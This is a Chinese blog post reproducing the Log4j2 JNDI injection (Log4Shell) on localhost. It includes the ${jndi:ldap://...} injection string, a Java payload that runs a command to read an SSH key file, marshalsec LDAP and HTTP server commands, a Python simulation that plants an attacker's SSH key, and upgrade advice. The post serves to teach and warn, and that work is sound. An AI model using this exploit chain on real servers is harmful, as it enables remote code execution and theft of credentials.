<h2>写在前面</h2><p data-pid="xXD2EdRr">2021年12月9日晚间，网上发生了一件大事，一个核弹级高危漏洞被曝光：Apache-Log4j2组件存在JNDI注入漏洞，攻击者无需特殊配置，即<b>可利用该漏洞在目标服务器上执行任意代码</b>。Log4j2是一款优秀的Java日志框架，被大量用于业务系统开发，用来记录日志信息。经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等组件均受影响，百度、苹果等公司的产品也存在以上问题。</p><p data-pid="F4gFdvA7">以百度为例，通常，我们在百度中搜索一个找不到结果的关键词，会得到以下提示：</p><figure data-size="normal"><noscript><img src="https://picx.zhimg.com/v2-842fb48ebda87abeeb03bd03ca8d2a99_720w.jpg?source=d16d100b" data-caption="" data-size="normal" data-rawwidth="853" data-rawheight="334" class="origin_image zh-lightbox-thumb" width="853" data-original="https://picx.zhimg.com/v2-842fb48ebda87abeeb03bd03ca8d2a99_720w.jpg?source=d16d100b"></noscript><img src="data:image/svg+xml;utf8,&lt;svg%20xmlns='http://www.w3.org/2000/svg'%20width='853'%20height='334'&gt;&lt;/svg&gt;" data-caption="" data-size="normal" data-rawwidth="853" data-rawheight="334" class="origin_image zh-lightbox-thumb lazy" width="853" data-original="https://picx.zhimg.com/v2-842fb48ebda87abeeb03bd03ca8d2a99_720w.jpg?source=d16d100b" data-actualsrc="https://picx.zhimg.com/v2-842fb48ebda87abeeb03bd03ca8d2a99_720w.jpg?source=d16d100b"></figure><p data-pid="LPtGndiI">但在输入我们构造好的注入攻击语句<code>${jndi:ldap://example.com}</code>时，是这样的效果：</p><figure data-size="normal"><noscript><img src="https://picx.zhimg.com/v2-b8cd997c83c163d3ed4fe54c2d1c845c_720w.jpg?source=d16d100b" data-caption="" data-size="normal" data-rawwidth="794" data-rawheight="345" class="origin_image zh-lightbox-thumb" width="794" data-original="https://picx.zhimg.com/v2-b8cd997c83c163d3ed4fe54c2d1c845c_720w.jpg?source=d16d100b"></noscript><img src="data:image/svg+xml;utf8,&lt;svg%20xmlns='http://www.w3.org/2000/svg'%20width='794'%20height='345'&gt;&lt;/svg&gt;" data-caption="" data-size="normal" data-rawwidth="794" data-rawheight="345" class="origin_image zh-lightbox-thumb lazy" width="794" data-original="https://picx.zhimg.com/v2-b8cd997c83c163d3ed4fe54c2d1c845c_720w.jpg?source=d16d100b" data-actualsrc="https://picx.zhimg.com/v2-b8cd997c83c163d3ed4fe54c2d1c845c_720w.jpg?source=d16d100b"></figure><p data-pid="gRNfWo2K">我猜想是百度后台临时加入一些逻辑简单地堵住了这个缺口，但没有从根本上完全修复。今天早上看到公众号<a href="http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/T0rw3YrWYavcR88j-dHvWg" class=" wrap external" target="_blank" rel="nofollow noreferrer">「信安之路」上的推文</a>得知此事，也来凑一下热闹。为了对这个漏洞的危害有一个直观的感受，我在此记录一下本地模拟复现这个漏洞的过程。我的实验环境使用的是一台Mac电脑，本地安装有java的执行环境，以及IntelliJ集成开发环境，Python的版本是3.x。由于我对网络安全基本不怎么了解，若有疏漏还请大家多批评。</p><h2>复现漏洞</h2><p data-pid="1uAbUDdG">存在漏洞的版本为：<code>Apache Log4j 2.x &lt;= 2.14.1</code>，我们从网上下载Log4j2对应的jar包，这里以2.12.1版本为例，可以从上海交大的官方镜像网站下载：<a href="http://link.zhihu.com/?target=https%3A//mirror.sjtu.edu.cn/apache/logging/log4j/2.12.1/apache-log4j-2.12.1-bin.tar.gz" class=" wrap external" target="_blank" rel="nofollow noreferrer">apache-log4j-2.12.1-bin.tar.gz</a>。下载之后通过tar命令解压：</p><div class="highlight"><pre><code class="language-bash"><span></span>tar -zxf apache-log4j-2.12.1-bin.tar.gz
</code></pre></div><p data-pid="3ZqC_Y19">之后我们在IntelliJ中新建一个工程，并在File &gt; Project Structure &gt; Project Settings-Modules处添加JARs，文件就在刚才解压好的文件夹里。这里最好把log4j-api-2.12.1.jar、log4j-core-2.12.1.jar、log4j-1.2-api-2.12.1.jar都导入进来。</p><figure data-size="normal"><noscript><img src="https://pica.zhimg.com/v2-50344f148e5af953594038f183226859_720w.jpg?source=d16d100b" data-caption="" data-size="normal" data-rawwidth="2673" data-rawheight="1120" class="origin_image zh-lightbox-thumb" width="2673" data-original="https://picx.zhimg.com/v2-50344f148e5af953594038f183226859_720w.jpg?source=d16d100b"></noscript><img src="data:image/svg+xml;utf8,&lt;svg%20xmlns='http://www.w3.org/2000/svg'%20width='2673'%20height='1120'&gt;&lt;/svg&gt;" data-caption="" data-size="normal" data-rawwidth="2673" data-rawheight="1120" class="origin_image zh-lightbox-thumb lazy" width="2673" data-original="https://picx.zhimg.com/v2-50344f148e5af953594038f183226859_720w.jpg?source=d16d100b" data-actualsrc="https://pica.zhimg.com/v2-50344f148e5af953594038f183226859_720w.jpg?source=d16d100b"></figure><p data-pid="HXVM9GD1">然后在src文件夹下创建log4j2.xml文件，作为log4j的配置文件，控制输出的格式。注意log4j的1版本可以使用 .properties后缀的文件进行配置，2版本只支持xml和json。</p><div class="highlight"><pre><code class="language-xml"><span></span><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;Configuration&gt;</span>
    <span class="nt">&lt;Appenders&gt;</span>
        <span class="nt">&lt;Console</span> <span class="na">name=</span><span class="s">"CONSOLE"</span> <span class="na">target=</span><span class="s">"SYSTEM_OUT"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;PatternLayout</span> <span class="na">pattern=</span><span class="s">"%d %-5p [%t] (%F:%L) - %m%n"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/Console&gt;</span>
    <span class="nt">&lt;/Appenders&gt;</span>
    <span class="nt">&lt;Loggers&gt;</span>
        <span class="nt">&lt;Root</span> <span class="na">level=</span><span class="s">"info"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;AppenderRef</span> <span class="na">ref=</span><span class="s">"CONSOLE"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/Root&gt;</span>
    <span class="nt">&lt;/Loggers&gt;</span>
<span class="nt">&lt;/Configuration&gt;</span>
</code></pre></div><p data-pid="OfTfaNfR">然后在src文件夹下创建Hack.java源文件，内容如下：</p><div class="highlight"><pre><code class="language-java"><span></span><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="p">;</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Hack</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="p">.</span><span class="na">getLogger</span><span class="p">(</span><span class="n">Hack</span><span class="p">.</span><span class="na">class</span><span class="p">);</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">System</span><span class="p">.</span><span class="na">setProperty</span><span class="p">(</span><span class="s">"com.sun.jndi.ldap.object.trustURLCodebase"</span><span class="p">,</span> <span class="s">"true"</span><span class="p">);</span>
        <span class="n">logger</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">"${jndi:ldap://127.0.0.1:1389/Log4jRCE}"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p data-pid="blsOXvAU">这个文件模拟的就是使用Log4j2框架的网站服务器程序。很多网站使用Java作为后端开发语言，网页中又具有提交表单的输入框，出于调试需要很可能会将输入框的内容通过logger进行输出。我们省略网页的逻辑，将输入框中的注入攻击语句直接作为参数传递给logger.error函数。</p><p data-pid="OYSIwgWe">然后选择一个其他的目录（与Hack.java不同目录），创建Log4jRCE.java文件。这个文件就是我们想要服务器执行的代码，我们可以在这个文件中尝试调用系统命令，这里以输出电脑的SSH公钥为例。</p><div class="highlight"><pre><code class="language-java"><span></span><span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="p">;</span>    
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="p">;</span>    
<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="p">;</span>    
<span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="p">;</span>    
   
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Log4jRCE</span> <span class="p">{</span>    
    <span class="kd">static</span> <span class="p">{</span>
        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">"I am Log4jRCE from remote!!!"</span><span class="p">);</span>
        <span class="n">Process</span> <span class="n">p</span><span class="p">;</span>
        <span class="n">String</span> <span class="o">[]</span> <span class="n">cmd</span> <span class="o">=</span> <span class="p">{</span><span class="s">"cat"</span><span class="p">,</span> <span class="s">"/Users/MAC/.ssh/id_rsa.pub"</span><span class="p">};</span> 
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
            <span class="n">InputStream</span> <span class="n">fis</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span>
            <span class="n">InputStreamReader</span> <span class="n">isr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InputStreamReader</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span>    
            <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="p">(</span><span class="n">isr</span><span class="p">);</span>    
            <span class="n">String</span> <span class="n">line</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span> 
            <span class="k">while</span><span class="p">((</span><span class="n">line</span><span class="o">=</span><span class="n">br</span><span class="p">.</span><span class="na">readLine</span><span class="p">())</span><span class="o">!=</span><span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
                 <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>    
        <span class="k">catch</span> <span class="p">(</span><span class="n">IOException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>    
             <span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
        <span class="p">}</span>
     <span class="p">}</span>    
<span class="p">}</span>
</code></pre></div><p data-pid="m1A8ZyNq">然后编译一下这个程序得到字节码文件Log4jRCE.class，命令如下：</p><div class="highlight"><pre><code class="language-text"><span></span>javac Log4jRCE.java
</code></pre></div><p data-pid="Rf0Ig8IT">然后我们<b>在这个文件夹下打开控制台</b>（保证服务器根目录下有Log4jRCE.class文件），启动Python自带的HTTP服务器：</p><div class="highlight"><pre><code class="language-powershell"><span></span><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="err">:</span><span class="n">8888</span>
<span class="p">----------------------------------------------------------------</span>
<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">port</span> <span class="n">8888</span> <span class="p">(</span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="err">:</span><span class="n">8888</span><span class="p">/)</span> <span class="p">...</span>
</code></pre></div><p data-pid="GT2h_m3W">接着我们还需要在本地启动一个LDAP服务器（这两个服务器都是在攻击者电脑上的）：</p><div class="highlight"><pre><code class="language-powershell"><span></span><span class="n">git</span> <span class="n">clone</span> <span class="n">git</span><span class="nv">@github</span><span class="p">.</span><span class="n">com</span><span class="err">:</span><span class="n">bkfish</span><span class="p">/</span><span class="n">Apache-Log4j-Learning</span><span class="p">.</span><span class="n">git</span>
<span class="nb">cd </span><span class="n">Apache-Log4j-Learning</span><span class="p">/</span><span class="n">tools</span>
<span class="n">java</span> <span class="n">-cp</span> <span class="n">marshalsec</span><span class="p">-</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">3-SNAPSHOT-all</span><span class="p">.</span><span class="n">jar</span> <span class="n">marshalsec</span><span class="p">.</span><span class="n">jndi</span><span class="p">.</span><span class="n">LDAPRefServer</span> <span class="s2">"http://127.0.0.1:8888/#Log4jRCE"</span>
</code></pre></div><p data-pid="kg2L3TOG">然后我们运行IntelliJ里的Hack.java模拟注入攻击提交表单的那一刻，服务器端使用log4j2输出日志，结果为：</p><figure data-size="normal"><noscript><img src="https://picx.zhimg.com/v2-0a425687b7283a687ad99d54e5145f84_720w.jpg?source=d16d100b" data-caption="" data-size="normal" data-rawwidth="2188" data-rawheight="368" class="origin_image zh-lightbox-thumb" width="2188" data-original="https://pic1.zhimg.com/v2-0a425687b7283a687ad99d54e5145f84_720w.jpg?source=d16d100b"></noscript><img src="data:image/svg+xml;utf8,&lt;svg%20xmlns='http://www.w3.org/2000/svg'%20width='2188'%20height='368'&gt;&lt;/svg&gt;" data-caption="" data-size="normal" data-rawwidth="2188" data-rawheight="368" class="origin_image zh-lightbox-thumb lazy" width="2188" data-original="https://pic1.zhimg.com/v2-0a425687b7283a687ad99d54e5145f84_720w.jpg?source=d16d100b" data-actualsrc="https://picx.zhimg.com/v2-0a425687b7283a687ad99d54e5145f84_720w.jpg?source=d16d100b"></figure><p data-pid="nfR7IWCr">可以看到，机器的公钥已经在服务器上被输出了。当然这并没有什么意义，但如果我们的Log4jRCE的逻辑是通过网络通信将私钥发送给指定服务器（攻击者的电脑），或者是将攻击者的SSH公钥写入Authorized_keys文件中，那么就会出现极其严重的安全问题。</p><p data-pid="EaitYYpS">总结一下攻击过程，攻击者在网页表单的输入框里输入注入攻击语句，在提交表单时，被服务器端的Log4j框架作为日志输出，但由于该库的某些解析构造漏洞，会把<code>${}</code>括号中的语句作为命令执行。攻击者的注入攻击语句经过解析会先访问ldap服务器，然后由ldap解析出我们要的文件名为Log4jRCE，ldap向HTTP服务器请求获取这个文件，最后网站服务器在本地实例化并执行这个java类，即攻击者的攻击脚本得到执行。</p><h2>修复方案</h2><p data-pid="562NUyCn">将Log4j框架升级到2.15.0版本：<a href="http://link.zhihu.com/?target=https%3A//repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/" class=" wrap external" target="_blank" rel="nofollow noreferrer">org/apache/logging/log4j/log4j-core/2.15.0</a>（感谢 <a class="member_mention" href="http://www.zhihu.com/people/9ef0b44d25403eb87fa9bc5f76d3bb47" data-hash="9ef0b44d25403eb87fa9bc5f76d3bb47" data-hovercard="p$b$9ef0b44d25403eb87fa9bc5f76d3bb47">@blindpirate</a> 指正，稳定的GA版本已在今晚18:26发布，链接已更新），并升级已知受影响的应用及组件，如 spring-boot-strater-log4j2 / Apache Solr / Apache Flink / Apache Druid。</p><figure data-size="normal"><noscript><img src="https://picx.zhimg.com/v2-cff1b1f78d2bbd0cacdc4c94f69fa0b3_720w.jpg?source=d16d100b" data-caption="" data-size="normal" data-rawwidth="1576" data-rawheight="351" class="origin_image zh-lightbox-thumb" width="1576" data-original="https://picx.zhimg.com/v2-cff1b1f78d2bbd0cacdc4c94f69fa0b3_720w.jpg?source=d16d100b"></noscript><img src="data:image/svg+xml;utf8,&lt;svg%20xmlns='http://www.w3.org/2000/svg'%20width='1576'%20height='351'&gt;&lt;/svg&gt;" data-caption="" data-size="normal" data-rawwidth="1576" data-rawheight="351" class="origin_image zh-lightbox-thumb lazy" width="1576" data-original="https://picx.zhimg.com/v2-cff1b1f78d2bbd0cacdc4c94f69fa0b3_720w.jpg?source=d16d100b" data-actualsrc="https://picx.zhimg.com/v2-cff1b1f78d2bbd0cacdc4c94f69fa0b3_720w.jpg?source=d16d100b"></figure><h2>参考文献</h2><ul><li data-pid="lg8SbQ09">关于JNDI的更多介绍可以参考：<a href="http://link.zhihu.com/?target=https%3A//y4er.com/post/attack-java-jndi-rmi-ldap-1/" class=" wrap external" target="_blank" rel="nofollow noreferrer">攻击Java中的JNDI、RMI、LDAP</a></li><li data-pid="nyVgtSRe">关于log4j2漏洞源代码的具体分析过程可以参考：<a href="http://link.zhihu.com/?target=https%3A//bbs.ichunqiu.com/thread-62322-1-1.html" class=" wrap external" target="_blank" rel="nofollow noreferrer">Apache Log4j2远程代码执行漏洞</a></li></ul><hr><p data-pid="lm6L4yXN"><b>12月11日更新：</b>补充一些网络安全常用的黑话</p><p data-pid="8rAtsGrd">我本人是做边缘端人工智能系统方向的，对渗透测试方面的知识并不了解，之前查到的资料里总是掺杂了很多缩写，对外行很不友好，这里列举一些作为记录。参考了文章<a href="http://link.zhihu.com/?target=https%3A//howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/" class=" wrap external" target="_blank" rel="nofollow noreferrer">渗透中 PoC、Exp、Payload 与 Shellcode 的区别</a>。</p><ul><li data-pid="bfQHo3m9"><code>PoC</code>，Proof of Concept，概念验证，常指一段漏洞证明的代码。</li><li data-pid="VytT5R01"><code>Exp</code>，Exploit，利用，指利用系统漏洞进行攻击的动作，我们复现漏洞的程序就算Exp。</li><li data-pid="WAAesCS_"><code>Payload</code>，有效载荷，指成功 exploit 之后，真正在目标系统执行的代码或指令。</li><li data-pid="tSp4tqzh"><code>Fuzz</code>，自动化模糊测试，有时候就用来指代生成实例测试，在GitHub上看到有人说「接下来fuzz一下」。</li><li data-pid="jxV7WiNP"><code>RCE</code>，remote command/code execute，远程代码执行漏洞。</li></ul><p data-pid="XnR6gWd1"><b>12月11日更新</b>：补充Log4j2 RCE漏洞的由来</p><p data-pid="AgC23oAW">为了输出日志时能够方便地输出任意位置的java对象，Log4j引入了一个叫Lookup的统一接口。这个接口允许在写日志的时候，按照具体的实现逻辑去查找对象的位置，并输出对象的内容。这里的对象通常在内存中，但由于java支持对象的序列化/反序列化，它也可以存储在硬盘文件里，甚至是远程服务器上。</p><p data-pid="QUHJy3cU">我们提到的JNDI就是对Lookup接口的一种实现。其本身也是一个接口，提供了命名关键字到对象的映射目录，允许开发者提供一个名称，即可获取到对象的内容。LDAP，即轻量级目录访问协议，是JNDI的一种底层实现，它可以让我们方便的查询分布式数据库。既然是分布式的，LDAP允许从远程服务器加载对象。而这里加载对象时使用的不是一般的反序列化方法，而是通过「命名引用」功能，支持直接从远程下载class文件并加载对象。</p><p data-pid="4bjzhZQT">于是，Log4j中就暗含了注入漏洞：允许传入参数解析为LDAP协议，从远程服务器下载class文件并执行。这个功能本来是为了方便开发，使java对象位置对上层应用透明，却不料酿成大祸。我对java并不熟悉，为了好理解，用Python打个比方，就当给大家讲了个笑话：</p><div class="highlight"><pre><code class="language-python"><span></span><span class="kn">import</span> <span class="nn">re</span>

<span class="c1"># Apache Log4j 2.x</span>
<span class="k">class</span> <span class="nc">Log4jLogger</span><span class="p">:</span>

    <span class="k">def</span> <span class="nf">error</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">text</span><span class="p">):</span>
        <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">"\$\{([^\}]*)\}"</span><span class="p">)</span>   
        <span class="k">if</span> <span class="n">pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>  <span class="c1"># 如果输入字符串中具有`${}`</span>
            <span class="c1"># 匹配`${}`中的指令，使用lookup接口根据指令查找对象，并将指令替换为对象内容</span>
            <span class="n">text</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">lookup</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">lookup</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">match</span><span class="p">):</span>

        <span class="k">def</span> <span class="nf">JNDI</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">protocol</span><span class="p">):</span>

            <span class="k">def</span> <span class="nf">LDAP</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>  <span class="c1"># LDAP是lookup最底层的实现</span>
                
                <span class="c1"># 从对应的HTTP服务器请求文件</span>
                <span class="n">http_sock</span> <span class="o">=</span> <span class="n">LDAP_Pool</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
                <span class="n">java_clas</span> <span class="o">=</span> <span class="n">HTTP_Pool</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">http_sock</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="s2">".class"</span><span class="p">)</span>

                <span class="c1"># 将class文件加载为实例对象</span>
                <span class="n">java_object</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">java_clas</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">java_object</span>

            <span class="k">def</span> <span class="nf">RMI</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>  <span class="c1"># RMI是另一种实现，也存在RCE漏洞</span>
                <span class="k">pass</span>  <span class="c1"># 略</span>

            <span class="n">function</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"ldap"</span><span class="p">:</span> <span class="n">LDAP</span><span class="p">,</span> <span class="s2">"rmi"</span><span class="p">:</span> <span class="n">RMI</span><span class="p">}</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">protocol</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">function</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

        <span class="c1"># 检测到使用了JNDI协议(top)和LDAP协议(low)</span>
        <span class="n">protocol</span><span class="p">,</span> <span class="n">location</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"://"</span><span class="p">)</span>
        <span class="n">prot_top</span><span class="p">,</span> <span class="n">prot_low</span> <span class="o">=</span> <span class="n">protocol</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">":"</span><span class="p">)</span>
        <span class="n">function</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"jndi"</span><span class="p">:</span> <span class="n">JNDI</span><span class="p">}</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">prot_top</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">function</span><span class="p">(</span><span class="o">*</span><span class="n">location</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'/'</span><span class="p">),</span> <span class="n">prot_low</span><span class="p">)</span>

<span class="c1"># 黑客开启HTTP服务器</span>
<span class="n">HTTP_Pool</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">"127.0.0.1:8888"</span><span class="p">:</span> <span class="p">{</span>
        <span class="s2">"Log4jRCE.class"</span><span class="p">:</span>  <span class="c1"># 服务器根目录下的文件</span>
            <span class="sd">'''{None: 'Greetings from RCE!'}.get(</span>
<span class="sd">                authorized_keys.append('ssh-rsa I/Can/Hack/u angry_employee@996.com')</span>
<span class="sd">            )'''</span>  <span class="c1"># 恶意脚本payload</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># 黑客开启LDAP服务器</span>
<span class="n">LDAP_Pool</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">"127.0.0.1:1389"</span><span class="p">:</span> <span class="s2">"127.0.0.1:8888"</span>
<span class="p">}</span>

<span class="c1"># Minecraft聊天窗口</span>
<span class="n">chat_content</span> <span class="o">=</span> <span class="s2">"谁知道沙漠神庙在哪个坐标?"</span>  <span class="c1"># 正常用户</span>
<span class="n">chat_content</span> <span class="o">=</span> <span class="s2">"${jndi:ldap://127.0.0.1:1389/Log4jRCE}"</span>  <span class="c1"># 黑客注入攻击</span>


<span class="c1"># Minecraft服务器</span>
<span class="n">authorized_keys</span> <span class="o">=</span> <span class="p">[]</span>

<span class="c1"># Minecraft后台使用Log4j库输出聊天内容</span>
<span class="n">logger</span> <span class="o">=</span> <span class="n">Log4jLogger</span><span class="p">()</span>
<span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">chat_content</span><span class="p">)</span>

<span class="c1"># Minecraft服务器中招</span>
<span class="nb">print</span><span class="p">(</span><span class="n">authorized_keys</span><span class="p">)</span>
</code></pre></div><p data-pid="P01cz6aK">Minecraft服务器输出结果：</p><div class="highlight"><pre><code class="language-text"><span></span>Greetings from RCE!
['ssh-rsa I/Can/Hack/u angry_employee@996.com']
</code></pre></div><hr><p data-pid="xisl1Obk">其实在2015年Apache的工具库就有过类似的RCE漏洞：</p><blockquote data-pid="wagNHhE2">最近出来一个比较严重的漏洞，在使用了Apache Commons Collections的Java应用，可以远程代码执行。包括最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用。</blockquote><p data-pid="Agjgmukz">漏洞原理可以参考文章<a href="http://link.zhihu.com/?target=https%3A//www.jianshu.com/p/e922ea492ccd" class=" wrap external" target="_blank" rel="nofollow noreferrer">java反序列化漏洞之Apache CommonsCollections浅析</a></p>